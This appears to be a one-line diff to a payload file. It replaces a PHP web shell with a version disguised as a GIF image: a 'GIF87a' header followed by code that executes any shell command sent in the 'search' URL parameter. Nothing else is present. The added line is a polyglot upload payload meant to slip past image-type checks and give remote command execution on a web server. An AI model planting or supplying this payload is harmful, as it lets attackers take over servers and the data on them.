@@ -1,1 +1,1 @@
->>><?=die(`$_GET['search']`)?><<<
+GIF87a|_|<?=die(`$_GET['search']`)?>
